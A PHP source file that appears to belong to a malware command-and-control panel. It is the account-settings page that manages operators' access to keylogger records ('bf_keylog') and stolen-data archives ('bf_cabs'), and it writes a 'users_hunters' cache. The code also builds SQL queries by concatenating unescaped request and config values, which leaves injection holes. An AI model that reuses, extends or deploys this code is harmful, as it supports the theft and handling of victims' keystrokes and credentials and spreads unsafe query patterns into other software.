<?php

function uh_load($row){
	global $uh;
	$row->config = json_decode($row->config);
	if($row->config->sbbc == true){
		$uh[$row->id] = $row;
	}
}

if(empty($Cur['id'])) $Cur['id'] = $_SESSION['user']->id;

if($Cur['id'] != $_SESSION['user']->id){
	if($_SESSION['user']->access['accounts']['setting'] != 'on'){
		$smarty->assign("site_data", "modules/accounts/access_denied.tpl");
		$smarty->display('index.tpl');
		exit;
	}
}

$goods = $mysqli->query('SELECT * FROM bf_goods');
$smarty->assign("goods", $goods);

$user = $mysqli->query('SELECT * FROM bf_users WHERE (id<>\'0\') AND (id=\''.$Cur['id'].'\') LIMIT 1');

$user->access = json_decode($user->access, true);
$user->config = json_decode($user->config, true);

if(empty($user->config['lang'])){
	$user->config['lang'] = $config['lang'];
}

if($_SESSION['user']->access['keylog']['index'] == 'on' && $user->access['keylog']['index'] == 'on'){
	if(!empty($user->config['klimit'])){
		$user->config['klimit'] = array_flip(json_decode(base64_decode($user->config['klimit']), true));
	}
}

if($_SESSION['user']->access['cabs']['index'] == 'on' && $user->access['cabs']['index'] == 'on'){
	if(!empty($user->config['climit'])){
		$user->config['climit'] = array_flip(json_decode(base64_decode($user->config['climit']), true));
	}
}

if(isset($_POST['save'])){
	unset($_POST['save']);

	foreach($_POST['cp'] as $key => $item){
		if(!preg_match('~^([0-9]+)$~is', $item) || empty($item)) $_POST['cp'][$key] = '100';
		if($item > 500)  $_POST['cp'][$key] = '100';
	}

	foreach($_POST as $key => $item){
		switch($key){
			case 'klimit':
				if(!empty($_POST['klimit'][0]) && $_POST['klimit'][0] != '*'){
					$_POST['klimit']['n'] = $_POST['klimit'][0];
					unset($_POST['klimit'][0]);
					$user->config[$key] = base64_encode(json_encode($_POST['klimit']));
				}else{
					$user->config[$key] = '';
				}
			break;

			case 'climit':
				if(!empty($_POST['climit'][0]) && $_POST['climit'][0] != '*'){
					$_POST['climit']['n'] = $_POST['climit'][0];
					unset($_POST['climit'][0]);
					$user->config[$key] = base64_encode(json_encode($_POST['climit']));
				}else{
					$user->config[$key] = '';
				}
			break;

			default:
				$user->config[$key] = $item;
			break;
		}
	}
	
	if(function_exists('save_history_log')){
		thl('Action: Edit user settings');
		thl('Login: ' . $user->login);
		save_history_log();
	}
	
	$mysqli->query('update bf_users set config = \''.json_encode($user->config).'\' WHERE (id = \''.$user->id.'\')');

	$user->config['klimit'] = array_flip(json_decode(base64_decode($user->config['klimit']), true));
	$user->config['climit'] = array_flip(json_decode(base64_decode($user->config['climit']), true));

	$uh = array();
	$mysqli->query('SELECT id,login,config,enable FROM bf_users', null, 'uh_load', false);
	file_put_contents('cache/users_hunters.json', json_encode($uh));

	if(!empty($_POST['lang'])) $_SESSION['user']->config['lang'] = $_POST['lang'];
	
	header('Location: /accounts/');
	exit;
}

$smarty->assign('user', $user);

if($_SESSION['user']->access['keylog']['index'] == 'on' && $user->access['keylog']['index'] == 'on'){
	$keylogs = $mysqli->query_cache('SELECT name, hash FROM bf_keylog', null, 600, true);
	$smarty->assign("keylogs", $keylogs);
}

if($_SESSION['user']->access['cabs']['index'] == 'on' && $user->access['cabs']['index'] == 'on'){
	$cabs = $mysqli->query_cache('SELECT DISTINCT(type) type FROM bf_cabs', null, 600, true);
	$smarty->assign("cabs", $cabs);
}

$prefix = scandir('cache/prefix/', false);
unset($prefix[0], $prefix[1]);
$smarty->assign("prefix", $prefix);

$dir['1'] = '<a href="/'.$Cur['to'].'/profile-'.$Cur['id'].'.html">'.ucfirst($user->login).'</a>';
$dir['2'] = '<a href="/'.$Cur['to'].'/'.$Cur['go'].'-'.$Cur['id'].'.html">'.$dirs[$Cur['to']][$Cur['go']].'</a>';

?>